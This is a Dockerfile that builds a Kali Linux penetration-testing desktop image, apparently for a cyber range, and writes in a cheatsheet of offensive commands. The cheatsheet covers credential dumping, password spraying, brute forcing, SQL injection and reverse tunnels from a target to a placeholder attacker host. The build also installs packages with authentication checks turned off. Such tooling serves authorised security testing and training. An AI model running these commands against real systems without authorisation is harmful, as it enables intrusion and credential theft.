# CYROID Kali Attack Box
# Full offensive security toolkit with KasmVNC desktop access
#
# Based on kasmweb/kali-rolling-desktop (includes Firefox) with additional penetration testing tools
# See: https://github.com/kasmtech/workspaces-images
#
# Build: docker build -t cyroid/kali-attack:latest .
# Run: docker run -d -p 6901:6901 -e VNC_PW=password cyroid/kali-attack:latest

ARG BASE_TAG="1.15.0"
FROM kasmweb/kali-rolling-desktop:${BASE_TAG}

LABEL maintainer="CYROID <https://github.com/cyroid>"
LABEL description="CYROID Kali Attack Box - Full offensive security toolkit"
LABEL version="1.0.0"

USER root

ENV DEBIAN_FRONTEND=noninteractive
ENV HOME=/home/kasm-default-profile

# Fix Kali GPG key (required when base image has outdated keyring)
# The key ED65462EC8D5E4C5 is the current Kali archive signing key
RUN apt-get update --allow-insecure-repositories && \
    apt-get install -y --allow-unauthenticated kali-archive-keyring && \
    rm -rf /var/lib/apt/lists/*

# Update repos and install core penetration testing tools
# Note: Some packages may not exist on all architectures, using || true for optional ones
RUN apt-get update && apt-get install -y --no-install-recommends \
    # ============ Network Reconnaissance & Scanning ============
    nmap \
    masscan \
    enum4linux \
    enum4linux-ng \
    ldap-utils \
    dnsrecon \
    dnsenum \
    fierce \
    netcat-openbsd \
    socat \
    tcpdump \
    wireshark \
    # ============ Exploitation Frameworks ============
    metasploit-framework \
    exploitdb \
    # ============ Active Directory Tools ============
    evil-winrm \
    bloodhound \
    impacket-scripts \
    python3-impacket \
    smbclient \
    smbmap \
    # ============ Password Attacks ============
    hashcat \
    john \
    hydra \
    medusa \
    responder \
    # ============ Wordlists ============
    wordlists \
    seclists \
    # ============ Tunneling & Pivoting ============
    proxychains4 \
    sshuttle \
    # ============ Web Application Testing ============
    nikto \
    gobuster \
    ffuf \
    sqlmap \
    wfuzz \
    whatweb \
    # ============ Reverse Engineering ============
    radare2 \
    # ============ Wireless (if USB passthrough available) ============
    aircrack-ng \
    # ============ Utilities ============
    curl \
    wget \
    git \
    vim \
    tmux \
    jq \
    tree \
    python3-pip \
    python3-venv \
    # ============ Shell & Scripting ============
    zsh \
    fzf \
    ripgrep \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Install optional packages that may not be available on all architectures
RUN apt-get update && apt-get install -y --no-install-recommends \
    rustscan \
    feroxbuster \
    ghidra \
    golang-go \
    || true \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Create tools directory
WORKDIR /opt/tools
RUN mkdir -p /opt/tools/peas /opt/tools/binaries

# ============ Install Additional Tools Not in Kali Repos ============
# Note: Some tools may not have ARM64 binaries, so we use || true for optional ones

# Kerbrute - AD username enumeration and password spraying (x86_64 only)
RUN ARCH=$(uname -m) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && \
        chmod +x /usr/local/bin/kerbrute; \
    else \
        echo "Kerbrute not available for $ARCH, skipping"; \
    fi

# Chisel - TCP/UDP tunneling over HTTP
RUN ARCH=$(uname -m) && \
    CHISEL_VERSION=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | grep tag_name | cut -d'"' -f4) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q "https://github.com/jpillora/chisel/releases/download/${CHISEL_VERSION}/chisel_${CHISEL_VERSION#v}_linux_amd64.gz" -O /tmp/chisel.gz; \
    elif [ "$ARCH" = "aarch64" ]; then \
        wget -q "https://github.com/jpillora/chisel/releases/download/${CHISEL_VERSION}/chisel_${CHISEL_VERSION#v}_linux_arm64.gz" -O /tmp/chisel.gz; \
    fi && \
    if [ -f /tmp/chisel.gz ]; then \
        gunzip /tmp/chisel.gz && \
        mv /tmp/chisel /usr/local/bin/chisel && \
        chmod +x /usr/local/bin/chisel; \
    fi

# Ligolo-ng agent - Advanced tunneling
RUN ARCH=$(uname -m) && \
    LIGOLO_VERSION=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep tag_name | cut -d'"' -f4) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O /tmp/ligolo.tar.gz; \
    elif [ "$ARCH" = "aarch64" ]; then \
        wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_arm64.tar.gz" -O /tmp/ligolo.tar.gz; \
    fi && \
    if [ -f /tmp/ligolo.tar.gz ]; then \
        tar -xzf /tmp/ligolo.tar.gz -C /opt/tools/binaries/ && \
        rm /tmp/ligolo.tar.gz && \
        ln -sf /opt/tools/binaries/agent /usr/local/bin/ligolo-agent; \
    fi

# PEAS - Privilege Escalation Awesome Scripts
RUN wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /opt/tools/peas/linpeas.sh && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /opt/tools/peas/winpeas64.exe && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O /opt/tools/peas/winpeas32.exe && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -O /opt/tools/peas/linpeas_amd64 && \
    chmod +x /opt/tools/peas/linpeas.sh /opt/tools/peas/linpeas_amd64

# Bloodhound.py - Python-based BloodHound ingestor
RUN pip3 install --break-system-packages bloodhound

# NetExec (successor to CrackMapExec)
RUN pip3 install --break-system-packages netexec || echo "NetExec install skipped"

# ============ Wordlist Preparation ============

# Decompress rockyou if compressed
RUN if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then \
        gunzip -k /usr/share/wordlists/rockyou.txt.gz || true; \
    fi

# ============ Environment Setup ============

# Add tools to PATH
ENV PATH="/opt/tools:/opt/tools/binaries:/usr/local/bin:${PATH}"

# Create useful aliases
RUN echo 'alias ll="ls -la"' >> /etc/bash.bashrc && \
    echo 'alias msfconsole="msfconsole -q"' >> /etc/bash.bashrc && \
    echo 'alias serve="python3 -m http.server 8080"' >> /etc/bash.bashrc && \
    echo 'alias linpeas="/opt/tools/peas/linpeas.sh"' >> /etc/bash.bashrc

# Create a cheatsheet in the home directory
RUN cat > /home/kasm-default-profile/TOOLS_CHEATSHEET.md << 'EOF'
# CYROID Kali Attack Box - Quick Reference

## Reconnaissance
```bash
# Nmap full scan
nmap -sC -sV -p- -oA full_scan <target>

# Fast port scan
rustscan -a <target> -- -sC -sV

# SMB enumeration
enum4linux-ng -A <target>
crackmapexec smb <target> -u '' -p ''
```

## Active Directory
```bash
# Get users via Kerberos
kerbrute userenum -d <domain> --dc <dc_ip> users.txt

# BloodHound collection
bloodhound-python -d <domain> -u <user> -p <pass> -c all -ns <dc_ip>

# Secretsdump
impacket-secretsdump <domain>/<user>:<pass>@<target>

# Evil-WinRM shell
evil-winrm -i <target> -u <user> -p <pass>
```

## Password Attacks
```bash
# Hashcat NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# Hydra SMB
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> smb
```

## Tunneling
```bash
# Chisel reverse proxy
# On attacker: chisel server -p 8080 --reverse
# On target: chisel client <attacker>:8080 R:socks

# Ligolo-ng
# On attacker: ligolo-proxy -selfcert
# On target: ligolo-agent -connect <attacker>:11601 -ignore-cert
```

## Web Testing
```bash
# Directory bruteforce
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# SQL injection
sqlmap -u "http://<target>/page?id=1" --batch --dbs
```

## File Locations
- Wordlists: /usr/share/wordlists/, /usr/share/seclists/
- PEAS scripts: /opt/tools/peas/
- Metasploit: /usr/share/metasploit-framework/
EOF

# Fix permissions
RUN chown -R 1000:1000 /home/kasm-default-profile /opt/tools

WORKDIR /home/kasm-user
USER 1000

# Expose KasmVNC port
EXPOSE 6901

# Default command (inherited from base image)
